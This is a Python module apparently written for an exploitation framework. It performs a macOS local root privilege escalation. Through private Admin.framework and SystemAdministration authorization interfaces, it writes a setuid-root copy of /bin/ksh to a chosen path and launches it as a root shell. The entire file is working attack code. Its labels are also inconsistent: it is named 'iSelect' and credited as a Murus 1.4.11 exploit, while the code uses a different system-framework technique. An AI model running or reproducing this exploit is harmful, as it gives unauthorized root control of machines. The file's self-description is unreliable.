import os
import platform
import re
import ctypes
import objc
import pip
import time
import subprocess

try:
    from Cocoa import NSData, NSMutableDictionary, NSFilePosixPermissions
except ImportError as e:
    pip.main(['install', "pyobjc"])

try:
    from Foundation import NSAutoreleasePool
except ImportError as e:
    pip.main(['install', "Foundation"])

from module_payload import PayloadModule


class BoomerModule(PayloadModule):
    def __init__(self):
        info = {"Name": "iSelect",
                "Module Author": "Antonio Marcos",
                "Exploit Author": "Mark Wadham (m4rkw)",
                "Description": "Murus 1.4.11 local root privilege escalation exploit",
                "Reference": "https://www.exploit-db.com/exploits/43217/",
                }
        options = {
            "src_file": ["Path of the binary that runs with root privileges", "/bin/ksh", True],
            "des_file": ["Path where the shell will be written", None, True]
        }
        compatible = []
        super(BoomerModule, self).__init__(options, info, compatible)

    def check(self):
        pass

    def run(self):
        try:

            source_binary = self.options.get("src_file")[1]
            dest_binary = self.options.get("des_file")[1]

            if source_binary == None \
                    or source_binary == "" \
                    or dest_binary == None \
                    or dest_binary == "":
                self.print_error("It's mandatory to specify a source file and a destination file!!")
                return

            if not os.path.exists(source_binary):
                self.print_error("File does not exist!")
                return

            if os.path.exists(dest_binary):
                self.print_error("Destination file already exists. Use another name or remove/rename the original file!")
                return

            pool = NSAutoreleasePool.alloc().init()

            attr = NSMutableDictionary.alloc().init()
            attr.setValue_forKey_(0o04777, NSFilePosixPermissions)
            data = NSData.alloc().initWithContentsOfFile_(source_binary)

            self.print_info("will write file " + dest_binary)

            if self.use_old_api():
                adm_lib = self.load_lib("/Admin.framework/Admin")
                Authenticator = objc.lookUpClass("Authenticator")
                ToolLiaison = objc.lookUpClass("ToolLiaison")
                SFAuthorization = objc.lookUpClass("SFAuthorization")

                authent = Authenticator.sharedAuthenticator()
                authref = SFAuthorization.authorization()

                # authref with value nil is not accepted on OS X <= 10.8
                authent.authenticateUsingAuthorizationSync_(authref)
                st = ToolLiaison.sharedToolLiaison()
                tool = st.tool()
                tool.createFileWithContents_path_attributes_(data, dest_binary, attr)
            else:
                adm_lib = self.load_lib("/SystemAdministration.framework/SystemAdministration")
                WriteConfigClient = objc.lookUpClass("WriteConfigClient")
                client = WriteConfigClient.sharedClient()
                client.authenticateUsingAuthorizationSync_(None)
                tool = client.remoteProxy()

                tool.createFileWithContents_path_attributes_(data, dest_binary, attr, 0)

            self.print_ok("Done!")

            del pool

            while not os.path.exists(dest_binary):
                self.print_info("Waiting file creation...")
                time.sleep(1)

            self.print_ok("Returning root whell at: " + dest_binary)
            subprocess.call(dest_binary)

        except OSError as e:
            if e.errno == os.errno.ENOENT:
                print("Sorry, iSelect binary - Not found!")
            else:
                print("Error executing exploit")
            raise

    def load_lib(self, append_path):
        return ctypes.cdll.LoadLibrary("/System/Library/PrivateFrameworks/" + append_path);

    def use_old_api(self):
        return re.match("^(10.7|10.8)(.\d)?$", platform.mac_ver()[0])